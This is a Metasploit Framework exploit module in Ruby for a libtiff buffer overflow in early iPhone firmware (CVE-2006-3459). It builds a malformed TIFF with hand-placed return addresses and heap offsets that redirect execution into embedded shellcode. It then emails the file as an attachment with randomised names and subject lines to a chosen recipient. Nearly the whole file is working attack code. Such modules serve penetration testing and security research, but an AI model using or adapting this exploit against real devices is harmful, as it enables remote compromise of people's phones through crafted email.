##
# $Id: mobilemail_libtiff.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	#
	# This module sends email messages via smtp
	#
	include Msf::Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'iPhone MobileMail LibTIFF Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the version of
				libtiff shipped with firmware versions 1.00, 1.01, 1.02, and
				1.1.1 of the Apple iPhone. iPhones which have not had the BSD
				tools installed will need to use a special payload.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['hdm', 'kf'],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2006-3459'],
					['OSVDB', '27723'],
					['BID', '19283']
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'Payload'        =>
				{
					'Space'    => 1800,
					'BadChars' => "",
					'Compat'   =>
						{
							'ConnectionType' => '-bind -find',
						},
				},
			'Targets'        =>
				[

					[ 'MobileSafari iPhone Mac OS X (1.00, 1.01, 1.02, 1.1.1)',
						{
							'Platform' => 'osx',

							# Scratch space for our shellcode and stack
							'Heap'     => 0x00802000,

							# Deep inside _swap_m88110_thread_state_impl_t() libSystem.dylib
							'Magic'    => 0x300d562c,
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 01 2006'
			))

	end

	def autofilter
		false
	end

	def exploit

		exts = ['jpg', 'tiff', 'tif']

		gext =  exts[rand(exts.length)]
		name = rand_text_alpha(rand(10)+1) + ".#{gext}"
		data = Rex::Text.rand_text_alpha(rand(32)+1)
		tiff = generate_tiff(target)

		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(Rex::Text.encode_base64(data, "\r\n"), "text/plain", "base64", "inline")
		msg.add_part_attachment(tiff, rand_text_alpha(rand(32)+1) + "." + gext)

		send_message(msg.to_s)

		print_status("Waiting for a payload session (backgrounding)...")
	end

	def generate_tiff(targ)
		#
		# This is a TIFF file, we have a huge range of evasion
		# capabilities, but for now, we don't use them.
		#  - https://strikecenter.bpointsys.com/articles/2007/10/10/october-2007-microsoft-tuesday
		#

		lolz = 2048
		tiff =
			"\x49\x49\x2a\x00\x1e\x00\x00\x00\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
			"\x00\x00\x00\x00\x00\x00\x08\x00\x00\x01\x03\x00"+
			"\x01\x00\x00\x00\x08\x00\x00\x00\x01\x01\x03\x00"+
			"\x01\x00\x00\x00\x08\x00\x00\x00\x03\x01\x03\x00"+
			"\x01\x00\x00\x00\xaa\x00\x00\x00\x06\x01\x03\x00"+
			"\x01\x00\x00\x00\xbb\x00\x00\x00\x11\x01\x04\x00"+
			"\x01\x00\x00\x00\x08\x00\x00\x00\x17\x01\x04\x00"+
			"\x01\x00\x00\x00\x15\x00\x00\x00\x1c\x01\x03\x00"+
			"\x01\x00\x00\x00\x01\x00\x00\x00\x50\x01\x03\x00"+
			[lolz].pack("V") +
			"\x84\x00\x00\x00\x00\x00\x00\x00"

		# Randomize the bajeezus out of our data
		hehe = rand_text(lolz)

		# Were going to candy mountain!
		hehe[120, 4] = [targ['Magic']].pack("V")

		# >> add r0, r4, #0x30
		hehe[104, 4] = [ targ['Heap'] - 0x30 ].pack("V")

		# Candy mountain, Charlie!
		# >> mov r1, sp

		# It will be an adventure!
		# >> mov r2, r8
		hehe[ 92, 4] = [ hehe.length ].pack("V")

		# Its a magic leoplurodon!
		# It has spoken!
		# It has shown us the way!
		# >> bl _memcpy

		# Its just over this bridge, Charlie!
		# This magical bridge!
		# >> ldr r3, [r4, #32]
		# >> ldrt r3, [pc], r3, lsr #30
		# >> str r3, [r4, #32]
		# >> ldr r3, [r4, #36]
		# >> ldrt r3, [pc], r3, lsr #30
		# >> str r3, [r4, #36]
		# >> ldr r3, [r4, #40]
		# >> ldrt r3, [pc], r3, lsr #30
		# >> str r3, [r4, #40]
		# >> ldr r3, [r4, #44]
		# >> ldrt r3, [pc], r3, lsr #30
		# >> str r3, [r4, #44]

		# We made it to candy mountain!
		# Go inside Charlie!
		# sub sp, r7, #0x14
		hehe[116, 4] = [ targ['Heap'] + 44 + 0x14 ].pack("V")

		# Goodbye Charlie!
		# ;; targ['Heap'] + 0x48 becomes the stack pointer
		# >> ldmia sp!, {r8, r10}

		# Hey, what the...!
		# >> ldmia sp!, {r4, r5, r6, r7, pc}

		# Return back to the copied heap data
		hehe[192, 4] = [  targ['Heap'] + 196  ].pack("V")

		# Insert our actual shellcode at heap location + 196
		hehe[196, payload.encoded.length] = payload.encoded

		tiff << hehe
	end

end
